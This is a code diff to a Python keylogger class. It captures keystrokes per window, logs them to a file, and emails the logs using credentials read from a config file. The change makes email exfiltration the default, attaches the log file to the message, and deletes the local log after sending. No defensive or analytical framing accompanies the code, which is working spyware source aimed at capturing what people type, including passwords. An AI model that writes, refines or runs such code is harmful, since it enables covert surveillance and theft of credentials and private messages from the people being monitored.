@@ -12,18 +12,19 @@ class KeyLogger:
 
     def __init__(self,log_method=1,log_file='keylog.txt',debug=False,time_interval=1):
         self.key_strokes = ""
-        self.log_file = None
+        self.log_file = log_file
+        if os.path.exists(self.log_file):
+            os.remove(self.log_file)
         self.timer = Thread(target=self.schedule_log,args=())
         self.timer.daemon = True
         self.time_interval = time_interval * 60
         self.keylog_data = []
         if log_method == 1:
             self.log_method = self.log_to_file
-            self.log_file = open(log_file,'w')
         elif log_method == 2:
-            self.log_method = self.tweet_log
-        elif log_method == 3:
             self.log_method = self.email_log
+        elif log_method == 3:
+            self.log_method = self.tweet_log
 
     def schedule_log(self):
         while True:
@@ -67,6 +68,7 @@ class KeyLogger:
         try:
             self.log_method(event=event)
             self.keylog_data = []
+            self.key_strokes = ""
         except Exception as e:
             print('Error occured: ',e) # logging
             print("Clearing log data...")
@@ -80,19 +82,20 @@ class KeyLogger:
                 log_info[f'{event.WindowName}'] = key_stroke
             else:
                 log_info[f'{event.WindowName}'] += key_stroke
-        for keys in log_info:
-            self.log_file.write(f'Window Name: [{keys}]\n\t{log_info[keys]}\n')
-            self.log_file.flush()
-
+        with open(self.log_file,'a+') as f:
+            f.write(time.strftime("%c\n"))
+            for keys in log_info:
+                f.write(f'Window Name: [{keys}]\n\t{log_info[keys]}\n')
+            f.write('*'*30+'\n\n')
 
     def tweet_log(self,*args,**kwargs):
         print("Tweeting keylogs: ",self.key_strokes)
-        self.key_strokes = ""
 
     def email_log(self,login_cred=None,*args,**kwargs):
         email = None
         password = None
         print("Sending email logs...")
+        self.log_to_file()
         if login_cred is None:
             if os.path.exists('email.cfg'):
                 config = configparser.ConfigParser()
@@ -101,9 +104,9 @@ class KeyLogger:
                 password = config['LOGIN_CRED']['PASSWORD']
         else:
             email, password = login_cred
-        send_mail(email,email,time.strftime('Keylogs for %c'),self.key_strokes,creds=(email,password))
-        self.key_strokes = ""
+        send_mail(email,email,time.strftime('Keylogs for %c'),self.key_strokes,files=[self.log_file],creds=(email,password))
+        os.remove(self.log_file)
 
 if __name__ == "__main__":
-    keylogger = KeyLogger(log_method=1,time_interval=0.1)
+    keylogger = KeyLogger(log_method=2,time_interval=0.1)
     keylogger.run()
